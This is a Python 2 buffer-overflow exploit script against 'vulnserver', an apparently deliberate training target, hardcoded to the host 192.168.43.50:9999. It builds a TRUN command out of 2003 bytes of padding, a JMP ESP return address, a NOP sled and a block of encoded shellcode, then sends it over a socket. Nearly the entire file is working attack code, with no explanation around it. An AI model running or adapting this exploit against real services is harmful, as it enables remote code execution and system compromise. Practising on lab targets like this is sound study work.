import os
import sys
import socket


host = "192.168.43.50"
port = 9999

# jmp address 778A13D5

jump = "\xD5\x13\x8A\x77"

shellcode =  ""
shellcode += "\xba\x81\x6d\xe3\x60\xda\xd3\xd9\x74\x24\xf4"
shellcode += "\x58\x29\xc9\xb1\x31\x83\xc0\x04\x31\x50\x0f"
shellcode += "\x03\x50\x8e\x8f\x16\x9c\x78\xcd\xd9\x5d\x78"
shellcode += "\xb2\x50\xb8\x49\xf2\x07\xc8\xf9\xc2\x4c\x9c"
shellcode += "\xf5\xa9\x01\x35\x8e\xdc\x8d\x3a\x27\x6a\xe8"
shellcode += "\x75\xb8\xc7\xc8\x14\x3a\x1a\x1d\xf7\x03\xd5"
shellcode += "\x50\xf6\x44\x08\x98\xaa\x1d\x46\x0f\x5b\x2a"
shellcode += "\x12\x8c\xd0\x60\xb2\x94\x05\x30\xb5\xb5\x9b"
shellcode += "\x4b\xec\x15\x1d\x98\x84\x1f\x05\xfd\xa1\xd6"
shellcode += "\xbe\x35\x5d\xe9\x16\x04\x9e\x46\x57\xa9\x6d"
shellcode += "\x96\x9f\x0d\x8e\xed\xe9\x6e\x33\xf6\x2d\x0d"
shellcode += "\xef\x73\xb6\xb5\x64\x23\x12\x44\xa8\xb2\xd1"
shellcode += "\x4a\x05\xb0\xbe\x4e\x98\x15\xb5\x6a\x11\x98"
shellcode += "\x1a\xfb\x61\xbf\xbe\xa0\x32\xde\xe7\x0c\x94"
shellcode += "\xdf\xf8\xef\x49\x7a\x72\x1d\x9d\xf7\xd9\x4b"
shellcode += "\x60\x85\x67\x39\x62\x95\x67\x6d\x0b\xa4\xec"
shellcode += "\xe2\x4c\x39\x27\x47\xa2\x73\x6a\xe1\x2b\xda"
shellcode += "\xfe\xb0\x31\xdd\xd4\xf6\x4f\x5e\xdd\x86\xab"
shellcode += "\x7e\x94\x83\xf0\x38\x44\xf9\x69\xad\x6a\xae"
shellcode += "\x8a\xe4\x08\x31\x19\x64\xe1\xd4\x99\x0f\xfd"


buffer = "TRUN /.:/" + 'A'*2003 + jump + "\x90"*100 + shellcode

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connection = s.connect((host, port))
	s.send(buffer)
	s.close()

except:
	print "\nCan not connect to vulnserver!\n"